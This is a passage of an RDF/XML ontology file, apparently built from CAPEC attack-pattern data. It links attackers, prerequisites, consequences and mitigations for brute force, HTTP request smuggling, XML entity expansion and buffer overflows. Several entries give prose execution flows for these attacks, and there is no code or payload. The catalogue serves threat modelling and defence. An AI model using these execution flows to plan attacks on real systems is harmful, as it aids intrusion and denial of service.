      <j.0:Resource rdf:about="http://krstProj.com/capec#::Fuzzing tools.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Perform validation on email header data::Implementation: Implement email filtering solutions on mail server or on MTA  relay server.::Implementation: Mail servers that perform strict validation may catch these attacks  because metacharacters are not allowed in many header variables such as dns names::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack499"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker392">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#583"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack392"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires physical access to the targeted communications equipment (networking devices  cables  etc.)  which may be spread over a wide area.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Limit the amount of resources that are accessible to unprivileged users.::Assume all input is malicious. Consider all potentially relevant properties when validating input.::Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::Use resource-limiting settings  if possible.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack35">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#130">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Excessive Allocation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::404::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption A successful excessive allocation attack forces the target system to exhaust its resources  thereby compromising the availability of its service.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Select a provably large secret space for selection of the secret. Provably large means that the procedure by which the secret is selected does not have artifacts that significantly reduce the size of the total secret space.::Do not provide the means for an attacker to determine success independently. This forces the attacker to check their guesses against an external authority  which can slow the attack and warn the defender. This mitigation may not be possible if testing material must appear externally  such as with a transmitted cryptotext.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack386">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#112">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Brute Force"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::330::326::521::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine secret testing procedure) Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value  use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example  turning cryptotext into plaintext)  or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally  the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.TECHNIQUE:Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources  thus dividing the average time to success by the number of resources available. If there is a single choke point  such as a need to check answers with an external authority  the attackers&apos; position is significantly degraded.::STEP:2:PHASE:Explore:DESCRIPTION:(Reduce search space) Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value  the greater their chances for success. There are a great many ways in which the search space may be reduced.TECHNIQUE:If possible  determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human  behavioral factors may  if not completely reduce the space  make some types of secrets more likely than others. (For example  humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.):TECHNIQUE:If the secret was chosen algorithmically  cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity  the need for seed values  or weaknesses in the generator all can result in a significantly smaller secret space.:TECHNIQUE:If the secret was chosen by a person  social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs  patterns in sources (dates  famous phrases  music lyrics  family members  etc.). Once these patterns have been determined  the initial efforts of a brute-force attack can focus on these areas.:TECHNIQUE:Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example  it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively  it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space  thus increasing speed with which the attacker discovers the secret.::STEP:3:PHASE:Explore:DESCRIPTION:(Expand victory conditions) It is sometimes possible to expand victory conditions. For example  the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space  the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.::STEP:4:PHASE:Exploit:DESCRIPTION:(Gather information so attack can be performed independently.) If possible  gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::The only known mitigation to this attack is to avoid installing the malicious application on the device. Applications usually have to declare the schemes they wish to register  so detecting this during a review is feasible.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack23"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker391">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#595"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack391"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::940::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This attack requires the ability to monitor the target&apos;s network connection.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Browser&apos;s design needs to be changed to limit where cookies can be stored on the client side and provide an option to clear these cookies in all places  as well as another option to stop these cookies from being written in the first place. Design: Safari browser&apos;s private browsing mode is currently effective against evercookies.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack236"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker501">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#592"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack501"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::79::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application that leverages a client-side web browser with scripting enabled.::An application that fails to adequately sanitize or encode untrusted input.::An application that stores information provided by the user in data storage of some kind.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Requires the ability to write scripts of varying complexity and to inject them through user controlled fields within the application.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker32">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#586"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack32"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::502::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must unserialize data before validation.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implement an audit log written to a separate host. In the event of a compromise  the audit log may be able to provide evidence and details of the compromise.::Treat all user input as untrusted data that must be validated before use.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack132"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker31">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#227">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Sustained Client Engagement"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack31">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#227"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::To successfully execute this pattern of attack  a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target  it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker500">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#588"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack500"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::79::20::83::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application that leverages a client-side web browser with scripting enabled.::An application that manipulates the DOM via client-side scripting.::An application that failS to adequately sanitize or encode untrusted input.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Requires the ability to write scripts of some complexity and to inject it through user controlled fields in the system.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::HTTP Request Smuggling is usually targeted at web servers. Therefore  in such cases  careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests  the choice of entities needs consideration.::Employing an application firewall can help. However  there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack378">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#33">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:220::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#HTTP Request Smuggling"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::444::436::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify HTTP parsing chain) Determine the technologies used in the target environment such as types of web servers  application firewalls  proxies  etc.TECHNIQUE:Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand the parsing chain traversed by the incoming HTTP request.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe for vulnerable differences in HTTP parsing chain) Attacker sends malformed HTTP Requests to the application looking for differences in the ways that individual layers in the parsing chain parse requests. When differences are identified  the attacker crafts specially malformed HTTP requests to determine if the identified parsing differences will allow extra requests to be smuggled through parsing layers.TECHNIQUE:Create many consecutive requests to the server. Some of which must be malformed.:TECHNIQUE:Use a proxy tool to record the HTTP responses headers.::STEP:3:PHASE:Exploit:DESCRIPTION:(Cache poisoning) The attacker decides to target the cache server. The server will then cache the request and serve a wrong page to a legitimate user&apos;s request. The malicious request will most likely exploit a Cross-Site Scripting or another injection typed vulnerability.TECHNIQUE:Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will be processed and acted on by the outer parsing layer of the cache server but not by the inner application layer. In this way it will be cached by the server without obvious sign from the application and the corrupt data will be served to future requesters.::STEP:4:PHASE:Exploit:DESCRIPTION:(Session Hijacking) The attacker decides to target the web server by crafting a malicious HTTP Request containing a second HTTP Request using syntax that will not be processed and acted on by an outer filter parsing layer but will be acted on by the inner web server/application processing layers. The application/web server will then act on the malicious HTTP Request as if it is a valid request from the client potentially subverting session management.TECHNIQUE:Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will not be processed and acted on by the outer parsing layer of the malicious content filters but will be by the inner application/web server layer. In this way it will be acted on by the application/web server as if it is a valid request from the client.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Avoid clicking on untrusted links. Employ techniques such as frame busting  which is a method by which developers aim to prevent their site being loaded within a frame.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack455">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#587">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:195::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Cross Frame Scripting (XFS)"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Cross Frame Scripting allows an adversary to steal sensitive data from a legitimate site.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker329">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#197">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:230::NATURE:CanFollow:CAPEC ID:228::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Entity Expansion"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack329">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#197"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::400::770::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using a browser or an automated tool  an attacker records all instances of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Exploit:DESCRIPTION:(Launch an XML Entity Expansion attack) The attacker crafts malicious XML message to force recursive entity expansion (or other repeated processing) that completely uses up available server resource.TECHNIQUE:Send the malicious crafted XML message containing recursive entity uses to the target URL.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption Denial of Service::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::400::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of attack requires that the target must receive XML input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To send recursive entity expansion XML messages.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker34">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#406"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack34"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary must have physical access to the dumpster or downstream processing facility.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Verify that files have proper access controls set  and reduce the storage of sensitive information to only what is necessary.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack150"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configuration: Make sure your DNS servers have been updated to the latest versions::Configuration: UNIX services like rlogin  rsh/rcp  xhost  and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.::Configuration: Disable client side DNS caching.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack1"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Security by Obscurity is not a solution to preventing SQL Injection. Rather than suppress error messages and exceptions  the application must handle them gracefully  returning either a custom error page or redirecting the user to a default page  without revealing any information about the database or the application internals.::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION  SELECT or INSERT must be filtered in addition to characters such as a single-quote(&apos;) or SQL-comments (--) based on the context in which they appear.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack366"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker328">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#218">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:148::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Spoofing of UDDI/ebXML Messages"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack328">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#218"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::345::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::345::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted business&apos;s UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack  the attacker may also need to serve its own web services.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker33">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#603"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack33"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This attack pattern requires knowledge of where important system resources are logically located as well as how they operate.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker505">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#94"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack505"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::300::290::593::287::294::724::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::There are two components communicating with each other.::An attacker is able to identify the nature and mechanism of communication between the two target components.::An attacker can eavesdrop on the communication between the target components.::Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.::The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack can get sophisticated since the attack may use cryptography.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker36">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#224"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack36"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A means by which to interact with the target system directly.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument  or mouse clicking in the appropriate place on the screen.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::If on a network  the adversary needs a tool capable of viewing network communications at the packet level and with header information  like Mitmproxy  Wireshark  or Fiddler.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker504">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#46">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::NATURE:PeerOf:CAPEC ID:8::NATURE:PeerOf:CAPEC ID:10::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Overflow Variables and Tags"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack504">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#46"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::120::118::119::74::20::680::733::697::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:The attacker modifies a tag or variable from a formatted configuration data. For instance she changes it to an oversized string.::STEP:2:PHASE:Exploit:DESCRIPTION:The target program consumes the data modified by the attacker without prior boundary checking. As a consequence  a buffer overflow occurs and at worst remote code execution may follow.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::118::119::74::20::680::733::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target program consumes user-controllable data in the form of tags or variables.::The target program does not perform sufficient boundary checking.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker35">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#130"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack35"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::770::404::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker38">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#446"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack38"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
